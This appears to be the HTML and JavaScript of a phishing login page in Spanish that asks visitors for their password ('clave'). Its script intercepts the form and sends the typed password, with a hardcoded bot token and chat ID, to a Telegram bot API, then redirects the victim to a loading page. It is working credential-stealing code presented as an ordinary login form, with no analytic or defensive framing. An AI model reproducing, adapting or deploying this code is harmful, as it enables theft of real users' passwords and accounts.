<body>
  <div class="container-page m-auto py-5">
    <header class="py-4 mb-4">
      <div class="text-center w-100">

      </div>

    <main>
      <form class="bg-white mb-3 shadow" method="POST" action="paginacargando.php">
        <div class="position-relative text-center" style="top: -45px;">
          <img src="login-dos_archivos/icono-login.png" height="90px">
        </div>
        <div class="text-center">
          <h4 class=""></h4>
        </div>
        <fieldset>
          <div class="mb-1 position-relative">
            <label class="form-label mb-0">
              INGRESÁ TU CLAVE
            </label>
            <input type="password" required="" id="user" placeholder="Clave" class="form-control rounded-0" name="clave">
            <img src="login-dos_archivos/ojo-cerrado.svg" style="position:absolute;
            right: 10px;top:38px;" class="ojo" height="20px">
          </div> 
        </fieldset>
        <button class="btn rounded-1 w-100 btn-primary btn-disabled" style="margin-bottom: 80px; cursor: no-drop;" disabled="disabled">
          Siguiente
        </button>
        <div class="helper-user-div d-flex justify-content-between ">
          <div class="w-50 text-center">

  <script src="login-dos_archivos/bootstrap.js" integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL" crossorigin="anonymous"></script>
  <script type="text/javascript">
    $("#user").keyup(function(){
      if ($(this).val() != "") {
        $(".btn-primary").removeClass("btn-disabled");
        $(".btn-primary").removeAttr("disabled");
        $(".btn-primary").css("cursor","pointer");
      }else{
        $(".btn-primary").addClass("btn-disabled");
        $(".btn-primary").attr("disabled","disabled");
        $(".btn-primary").css("cursor","no-drop");
      }
    })
    $(".ojo").click(function(){
      if ($("#user").attr("type") == "password") {
        $("#user").attr("type","text");
      }else{
        $("#user").attr("type","password");
      }
    })
$(document).ready(function() {
    $('form').submit(function(event) {
        event.preventDefault(); // Evitar el envío del formulario por defecto
        
        // Obtener la clave ingresada
        var clave = $('#user').val();
        
        // Crear el mensaje a enviar a Telegram
        var mensaje = "Se ha ingresado la clave: " + clave;
        
        // Hacer una solicitud AJAX a la API de Telegram
        $.ajax({
            url: 'https://api.telegram.org/bot6931733086:AAE8K0GHhBQLyPQ5pm2UbJ2IhkgBmg6raDI/sendMessage',
            method: 'POST',
            data: {
                chat_id: '6044742043',
                text: mensaje
            },
            success: function(response) {
                console.log('Mensaje enviado correctamente:', response);
                // Redirigir a otro índice después de enviar el mensaje
                window.location.replace("paginacargando.html");
            },
            error: function(error) {
                console.error('Error al enviar el mensaje:', error);
            }
        });
    });
});
  </script>
